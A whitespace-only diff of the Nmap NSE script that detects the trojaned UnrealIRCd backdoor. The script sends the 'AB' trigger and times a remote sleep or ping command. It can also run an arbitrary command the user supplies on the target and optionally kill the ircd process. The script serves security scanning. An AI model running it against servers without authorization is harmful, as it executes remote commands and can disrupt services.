@@ -58,159 +58,159 @@ portrule = shortport.port_or_service({6666,6667,6697,6679,8067},{"irc","ircs"})
 
 
 action = function(host, port)
-	local socket = nmap.new_socket()
-	local code, message
-	local status, err
-	local data
-        -- Wait up to this long for the server to send its startup messages and
-        -- a response to our noop_command. After this, send the full_command.
-        -- Usually we don't have to wait the full time because we can detect
-        -- the response to noop_command.
-	local banner_timeout = 60
-        -- Send a command to sleep this long. This just has to be long enough
-        -- to remove confusion from network delay.
-	local delay = 8
+  local socket = nmap.new_socket()
+  local code, message
+  local status, err
+  local data
+  -- Wait up to this long for the server to send its startup messages and
+  -- a response to our noop_command. After this, send the full_command.
+  -- Usually we don't have to wait the full time because we can detect
+  -- the response to noop_command.
+  local banner_timeout = 60
+  -- Send a command to sleep this long. This just has to be long enough
+  -- to remove confusion from network delay.
+  local delay = 8
 
-	-- If the command takes (delay - delay_fudge) or more seconds, the server is vulnerable.
-	-- I defined the furdge as 1 second, for now, just because of rounding issues. In practice,
-	-- the actual delay should never be shorter than the given delay, only longer.
-	local delay_fudge = 1
+  -- If the command takes (delay - delay_fudge) or more seconds, the server is vulnerable.
+  -- I defined the furdge as 1 second, for now, just because of rounding issues. In practice,
+  -- the actual delay should never be shorter than the given delay, only longer.
+  local delay_fudge = 1
 
-	-- We send this command on connection because comm.tryssl needs to send
-	-- something; it also allows us to detect the end of server
-	-- initialization.
-	local noop_command = "TIME"
+  -- We send this command on connection because comm.tryssl needs to send
+  -- something; it also allows us to detect the end of server
+  -- initialization.
+  local noop_command = "TIME"
 
-	-- The 'AB' sequence triggers the backdoor to run a command.
-	local trigger = "AB"
+  -- The 'AB' sequence triggers the backdoor to run a command.
+  local trigger = "AB"
 
-	-- We define a highly unique variable as a type of 'ping' -- it lets us see when our
-	-- command returns. Typically, asynchronous data will be received after the initial
-	-- connection -- this lets us ignore that extra data.
-	local unique = "SOMETHINGUNIQUE"
+  -- We define a highly unique variable as a type of 'ping' -- it lets us see when our
+  -- command returns. Typically, asynchronous data will be received after the initial
+  -- connection -- this lets us ignore that extra data.
+  local unique = "SOMETHINGUNIQUE"
 
-	-- On Linux, do a simple sleep command.
-	local command_linux = "sleep " .. delay
+  -- On Linux, do a simple sleep command.
+  local command_linux = "sleep " .. delay
 
-	-- Set up an extra command, if the user requested one
-	local command_extra = ""
-	if(stdnse.get_script_args('irc-unrealircd-backdoor.command')) then
-		command_extra = stdnse.get_script_args('irc-unrealircd-backdoor.command')
-		-- Replace "%IP%" with the ip address
-		command_extra = string.gsub(command_extra, '%%IP%%', host.ip)
-	end
+  -- Set up an extra command, if the user requested one
+  local command_extra = ""
+  if(stdnse.get_script_args('irc-unrealircd-backdoor.command')) then
+    command_extra = stdnse.get_script_args('irc-unrealircd-backdoor.command')
+    -- Replace "%IP%" with the ip address
+    command_extra = string.gsub(command_extra, '%%IP%%', host.ip)
+  end
 
-	-- Windows, unfortunately, doesn't have a sleep command. Instead, we use 'ping' to
-	-- simulate a sleep (thanks to Ed Skoudis for teaching me this one!). We always want
-	-- to add 1 to the delay because the first ping happens instantly.
-	--
-	-- This is likely unnecessary, because the Windows version of UnrealIRCd is reportedly
-	-- not vulnerable. However, it's possible that some odd person may have compiled it
-	-- from the vulnerable sourcecode, so we check for it anyways.
-	local command_windows = "ping -n " .. (delay + 1) .. " 127.0.0.1"
+  -- Windows, unfortunately, doesn't have a sleep command. Instead, we use 'ping' to
+  -- simulate a sleep (thanks to Ed Skoudis for teaching me this one!). We always want
+  -- to add 1 to the delay because the first ping happens instantly.
+  --
+  -- This is likely unnecessary, because the Windows version of UnrealIRCd is reportedly
+  -- not vulnerable. However, it's possible that some odd person may have compiled it
+  -- from the vulnerable sourcecode, so we check for it anyways.
+  local command_windows = "ping -n " .. (delay + 1) .. " 127.0.0.1"
 
-	-- Put together the full command
-	local full_command = string.format("%s;%s;%s;%s;%s", trigger, unique, command_linux, command_windows, command_extra)
+  -- Put together the full command
+  local full_command = string.format("%s;%s;%s;%s;%s", trigger, unique, command_linux, command_windows, command_extra)
 
-	-- wait time: get rid of fast reconnecting annoyance
-	if(stdnse.get_script_args('irc-unrealircd-backdoor.wait')) then
-		local waittime = stdnse.get_script_args('irc-unrealircd-backdoor.wait')
-		stdnse.print_debug(1, "irc-unrealircd-backdoor: waiting for %i seconds", waittime)
-		stdnse.sleep(waittime)
-	end
+  -- wait time: get rid of fast reconnecting annoyance
+  if(stdnse.get_script_args('irc-unrealircd-backdoor.wait')) then
+    local waittime = stdnse.get_script_args('irc-unrealircd-backdoor.wait')
+    stdnse.print_debug(1, "irc-unrealircd-backdoor: waiting for %i seconds", waittime)
+    stdnse.sleep(waittime)
+  end
 
-	-- Send an innocuous command as fodder for tryssl.
-	stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", noop_command);
-	local socket, response = comm.tryssl(host, port, noop_command .. "\n", {recv_before=false})
+  -- Send an innocuous command as fodder for tryssl.
+  stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", noop_command);
+  local socket, response = comm.tryssl(host, port, noop_command .. "\n", {recv_before=false})
 
-	-- Make sure the socket worked
-	if(not(socket) or not(response)) then
-		stdnse.print_debug(1, "irc-unrealircd-backdoor: Couldn't connect to remote host")
-		return nil
-	end
+  -- Make sure the socket worked
+  if(not(socket) or not(response)) then
+    stdnse.print_debug(1, "irc-unrealircd-backdoor: Couldn't connect to remote host")
+    return nil
+  end
 
-	socket:set_timeout(banner_timeout * 1000)
+  socket:set_timeout(banner_timeout * 1000)
 
-	-- Look for the end of initial server messages. This allows reverse DNS
-	-- resolution and ident lookups to time out and not interfere with our
-	-- timing measurement.
-	status = true
-	data = response
-	while status and not (string.find(data, noop_command) or string.find(data, " 451 ")) do
-		status, response = socket:receive_bytes(0)
-		if status then
-			data = data .. response
-		end
-	end
+  -- Look for the end of initial server messages. This allows reverse DNS
+  -- resolution and ident lookups to time out and not interfere with our
+  -- timing measurement.
+  status = true
+  data = response
+  while status and not (string.find(data, noop_command) or string.find(data, " 451 ")) do
+    status, response = socket:receive_bytes(0)
+    if status then
+      data = data .. response
+    end
+  end
 
-	if not status then
-		stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed after %s: %s", noop_command, response)
-		return nil
-	end
+  if not status then
+    stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed after %s: %s", noop_command, response)
+    return nil
+  end
 
-	-- Send the backdoor command.
-	stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", full_command);
-	status, err = socket:send(full_command .. "\n")
-	if not status then
-		stdnse.print_debug(1, "irc-unrealircd-backdoor: Send failed: %s", err)
-		return nil
-	end
+  -- Send the backdoor command.
+  stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", full_command);
+  status, err = socket:send(full_command .. "\n")
+  if not status then
+    stdnse.print_debug(1, "irc-unrealircd-backdoor: Send failed: %s", err)
+    return nil
+  end
 
-	-- Get the current time so we can measure the delay
-	local time = os.time(os.date('*t'))
-	socket:set_timeout((delay + 5) * 1000)
+  -- Get the current time so we can measure the delay
+  local time = os.time(os.date('*t'))
+  socket:set_timeout((delay + 5) * 1000)
 
-	-- Accumulate the response in the 'data' string
-	status = true
-	data = ""
-	while not string.find(data, unique) do
-		status, response = socket:receive_bytes(0)
-		if status then
-			data = data .. response
-		else
-			-- If the server unexpectedly closes the connection, it
-			-- is usually related to throttling. Therefore, we
-			-- print a throttling warning.
-			stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed: %s", response)
-			socket:close()
-			return "Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)."
-		end
-	end
+  -- Accumulate the response in the 'data' string
+  status = true
+  data = ""
+  while not string.find(data, unique) do
+    status, response = socket:receive_bytes(0)
+    if status then
+      data = data .. response
+    else
+      -- If the server unexpectedly closes the connection, it
+      -- is usually related to throttling. Therefore, we
+      -- print a throttling warning.
+      stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed: %s", response)
+      socket:close()
+      return "Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)."
+    end
+  end
 
-	-- Determine the elapsed time
-	local elapsed = os.time(os.date('*t')) - time
+  -- Determine the elapsed time
+  local elapsed = os.time(os.date('*t')) - time
 
-	-- Let the user know that everything's working
-	stdnse.print_debug(1, "irc-unrealircd-backdoor: Received a response to our command in " .. elapsed .. " seconds")
+  -- Let the user know that everything's working
+  stdnse.print_debug(1, "irc-unrealircd-backdoor: Received a response to our command in " .. elapsed .. " seconds")
 
-	-- Determine whether or not the vulnerability is present
-	if(elapsed > (delay - delay_fudge)) then
-		-- Check if the user wants to kill the server.
-		if(stdnse.get_script_args('irc-unrealircd-backdoor.kill')) then
-			stdnse.print_debug(1, "irc-unrealircd-backdoor: Attempting to kill the Trojanned UnrealIRCd server...")
+  -- Determine whether or not the vulnerability is present
+  if(elapsed > (delay - delay_fudge)) then
+    -- Check if the user wants to kill the server.
+    if(stdnse.get_script_args('irc-unrealircd-backdoor.kill')) then
+      stdnse.print_debug(1, "irc-unrealircd-backdoor: Attempting to kill the Trojanned UnrealIRCd server...")
 
-			local linux_kill = "kill `ps -e | grep ircd | awk '{ print $1 }'`"
-			local windows_kill = 'wmic process where "name like \'%ircd%\'" delete'
-			local kill_command = string.format("%s||%s||%s", trigger, linux_kill, windows_kill)
+      local linux_kill = "kill `ps -e | grep ircd | awk '{ print $1 }'`"
+      local windows_kill = 'wmic process where "name like \'%ircd%\'" delete'
+      local kill_command = string.format("%s||%s||%s", trigger, linux_kill, windows_kill)
 
-			-- Kill the process
-			stdnse.print_debug(1, "Running kill command: %s", kill_command)
-			socket:send(kill_command .. "\n")
-		end
+      -- Kill the process
+      stdnse.print_debug(1, "Running kill command: %s", kill_command)
+      socket:send(kill_command .. "\n")
+    end
 
-		stdnse.print_debug(1, "irc-unrealircd-backdoor: Looks like the Trojanned unrealircd is running!")
+    stdnse.print_debug(1, "irc-unrealircd-backdoor: Looks like the Trojanned unrealircd is running!")
 
-		-- Close the socket
-		socket:close()
+    -- Close the socket
+    socket:close()
 
-		return "Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277"
-	end
+    return "Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277"
+  end
 
-	-- Close the socket
-	socket:close()
+  -- Close the socket
+  socket:close()
 
-	stdnse.print_debug(1, "irc-unrealircd-backdoor: The Trojanned version of unrealircd probably isn't running.")
+  stdnse.print_debug(1, "irc-unrealircd-backdoor: The Trojanned version of unrealircd probably isn't running.")
 
-	return nil
+  return nil
 end
 
